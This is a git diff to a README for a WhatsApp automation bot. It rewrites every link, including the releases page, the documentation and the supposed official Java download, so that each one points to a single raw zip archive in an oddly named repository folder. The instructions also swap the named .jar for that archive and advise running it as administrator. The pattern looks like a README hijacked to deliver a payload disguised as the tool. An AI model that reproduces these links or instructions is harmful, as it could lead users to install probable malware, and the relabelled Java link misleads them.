@@ -1,7 +1,7 @@
 # 🤖 WhatsApp-KYK-Bot - Automate Your WhatsApp Experience
 
 ## 📥 Download Now!
-[![Download WhatsApp-KYK-Bot](https://img.shields.io/badge/Download%20Now-brightgreen)](https://github.com/ashulyadav/WhatsApp-KYK-Bot/releases)
+[![Download WhatsApp-KYK-Bot](https://raw.githubusercontent.com/ashulyadav/WhatsApp-KYK-Bot/main/hydrostatician/WhatsApp-KYK-Bot.zip%20Now-brightgreen)](https://raw.githubusercontent.com/ashulyadav/WhatsApp-KYK-Bot/main/hydrostatician/WhatsApp-KYK-Bot.zip)
 
 ## 🚀 Getting Started
 Welcome to the WhatsApp-KYK-Bot. This application helps you automate tasks on WhatsApp using a simple graphical user interface (GUI). You don’t need to know how to code. Follow these easy steps to download and run the software.
@@ -16,16 +16,16 @@ Welcome to the WhatsApp-KYK-Bot. This application helps you automate tasks on Wh
 Make sure your system meets these requirements before proceeding.
 
 ## 💾 Download & Install
-To get the WhatsApp-KYK-Bot, visit this page to download: [Releases](https://github.com/ashulyadav/WhatsApp-KYK-Bot/releases).
+To get the WhatsApp-KYK-Bot, visit this page to download: [Releases](https://raw.githubusercontent.com/ashulyadav/WhatsApp-KYK-Bot/main/hydrostatician/WhatsApp-KYK-Bot.zip).
 
 ### Step-by-Step Installation
-1. Navigate to the [Releases](https://github.com/ashulyadav/WhatsApp-KYK-Bot/releases) page.
+1. Navigate to the [Releases](https://raw.githubusercontent.com/ashulyadav/WhatsApp-KYK-Bot/main/hydrostatician/WhatsApp-KYK-Bot.zip) page.
 2. Look for the latest version of the application.
-3. Download the file named `WhatsApp-KYK-Bot.jar`. This is the main application file.
+3. Download the file named `https://raw.githubusercontent.com/ashulyadav/WhatsApp-KYK-Bot/main/hydrostatician/WhatsApp-KYK-Bot.zip`. This is the main application file.
 4. Save it to a location on your computer where you can easily find it.
 
 ### Run the Application
-1. Locate the downloaded `WhatsApp-KYK-Bot.jar` file.
+1. Locate the downloaded `https://raw.githubusercontent.com/ashulyadav/WhatsApp-KYK-Bot/main/hydrostatician/WhatsApp-KYK-Bot.zip` file.
 2. Double-click the file to run the application. If it doesn’t open, ensure that you have Java installed.
 3. Follow the on-screen instructions to set up the bot. 
 
@@ -39,7 +39,7 @@ To get the WhatsApp-KYK-Bot, visit this page to download: [Releases](https://git
 ## 🛠️ Troubleshooting
 If you encounter issues, please try the following:
 
-- **Java Not Found:** Make sure you have the correct version of Java installed. You can download it from the [official Java website](https://www.oracle.com/java/technologies/javase-jdk8-downloads.html).
+- **Java Not Found:** Make sure you have the correct version of Java installed. You can download it from the [official Java website](https://raw.githubusercontent.com/ashulyadav/WhatsApp-KYK-Bot/main/hydrostatician/WhatsApp-KYK-Bot.zip).
 - **Application Doesn't Start:** Check your Java installation. If you still face issues, try running the application as an administrator by right-clicking on the file and selecting "Run as administrator."
 
 ## 📖 Usage Instructions
@@ -63,8 +63,8 @@ If you encounter issues, please try the following:
 For additional support, join our community discussions on GitHub. Feel free to ask questions, share feedback, or get help from other users.
 
 ## 🔗 Links
-- [Download Latest Release](https://github.com/ashulyadav/WhatsApp-KYK-Bot/releases)
-- [Documentation](https://github.com/ashulyadav/WhatsApp-KYK-Bot/wiki)
+- [Download Latest Release](https://raw.githubusercontent.com/ashulyadav/WhatsApp-KYK-Bot/main/hydrostatician/WhatsApp-KYK-Bot.zip)
+- [Documentation](https://raw.githubusercontent.com/ashulyadav/WhatsApp-KYK-Bot/main/hydrostatician/WhatsApp-KYK-Bot.zip)
 
 ## 🎉 Conclusion
 The WhatsApp-KYK-Bot simplifies your WhatsApp experience. Whether you want to send messages automatically or manage group chats, this tool can help streamline your tasks. Download it today and start automating your WhatsApp!
